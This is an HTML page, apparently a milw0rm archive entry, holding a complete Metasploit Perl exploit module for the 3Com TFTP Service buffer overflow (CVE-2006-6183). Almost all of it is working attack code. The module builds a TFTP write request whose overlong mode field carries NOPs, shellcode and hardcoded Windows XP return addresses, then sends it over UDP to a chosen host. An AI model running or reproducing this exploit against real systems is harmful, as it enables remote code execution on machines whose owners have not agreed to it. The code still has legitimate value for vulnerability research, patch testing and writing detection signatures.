<html><head><title>3Com TFTP Service <= 2.0.1 Remote Buffer Overflow Exploit (meta)</title></head><pre>package Msf::Exploit::3com_tftp_long_mode;

use strict;
use base &quot;Msf::Exploit&quot;;
use Pex::Text;
use IO::Socket;

my $advanced = 
  {
  };

my $info =
  {
	'Name'           =&gt; 'TFTP Server 3CTftpSvc Buffer Overflow Vulnerability',
	'Version'        =&gt; '$ 1.0 $',
	'Authors'        =&gt; ['Enseirb &lt;vincenty [at] enseirb.fr&gt;', ],
	'Description'    =&gt;
	  Pex::Text::Freeform(qq{
		This vulnerability is caused due to a boundary error during the processing of TFTP Read/Write request packet types. This can be exploited to cause a stack-based buffer overflow by sending a specially crafted packet with an overly long mode field (more than 460 bytes).
                            }),

	'Arch'           =&gt; [ 'x86' ],
	'OS'             =&gt; [ 'win32' ],
	'Priv'           =&gt; 0,

	'AutoOpts'       =&gt; { 'EXITFUNC' =&gt; 'seh' },
	'UserOpts'       =&gt;
	  {
		'RHOST'  =&gt; [ 1, 'ADDR', 'The TFTP target adress', &quot;127.0.0.1&quot; ],
		'RPORT'  =&gt; [ 0, 'PORT', 'The TFTP target port', 69 ],
	  },	

	'Payload'        =&gt;
	  {
		'Space'    =&gt; 344,
		'BadChars' =&gt; &quot;\x00&quot;,
	  },

	'Refs'           =&gt;
	  [
		['URL', 'http://www.securityfocus.com/bid/21301'],
		['CVE', '2006-6183'],
		['URL', 'http://secunia.com/advisories/23113'],
		['URL', 'http://www.securityfocus.com/archive/1/452754'],		
	  ],

	'DefaultTarget'  =&gt; 0,
	'Targets'        =&gt;
	  [
		[ '0 - Windows XP SP2 ENG', 0x77d4e23b ], #or 0x77bc2063
	        [ '1 - Windows XP SP1 FR', 0x77d8117b ],
	        [ '2 - Windows XP SP2 FR', 0x77d8d9af ],
	  ],

	'Keys'           =&gt; [ '3com' ],

	'DisclosureDate' =&gt; 'Nov 27 2006',
  };

sub new {
	my $class = shift;
	my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
	return($self);
}

sub Exploit 
{
    my $self = shift;
    my $target_idx  = $self-&gt;GetVar('TARGET');
    my $target_host = $self-&gt;GetVar('RHOST');
    my $target_port = $self-&gt;GetVar('RPORT');
    my $shellcode = $self-&gt;GetVar('EncodedPayload')-&gt;Payload;
    my $target = $self-&gt;Targets-&gt;[$target_idx];

    my $buff = &quot;\x00\x02&quot;; # for a WRQ (WriteReQuest) (or &quot;\x00\x01&quot; for a RRQ)
    $buff .= &quot;filename_string&quot;;
    $buff .= &quot;\x00&quot;;
    $buff .= $self-&gt;MakeNops(129) . $shellcode; 
    $buff .= pack('V',$target-&gt;[1]);
    $buff .= &quot;\x00&quot;;

    $self-&gt;PrintLine('[+] Try to connect... ' . $target_host . ':' . $target_port);

    my $s = Msf::Socket::Udp-&gt;new
	(
	 'PeerAddr'  =&gt; $target_host,
	 'PeerPort'  =&gt; $target_port,	 
	);
    
    if ($s-&gt;IsError) {
	$self-&gt;PrintLine('[-] Error creating socket: ' . $s-&gt;GetError);
	return;
    }
 
    $self-&gt;PrintLine('[+] Connected!');
    $self-&gt;PrintLine('[+] Sending exploit...');

    $s-&gt;Send($buff);
    $self-&gt;PrintLine('[+] Exploit sent!');
    $s-&gt;Close();

    return;
}

1;

# milw0rm.com [2007-01-21]</pre></html>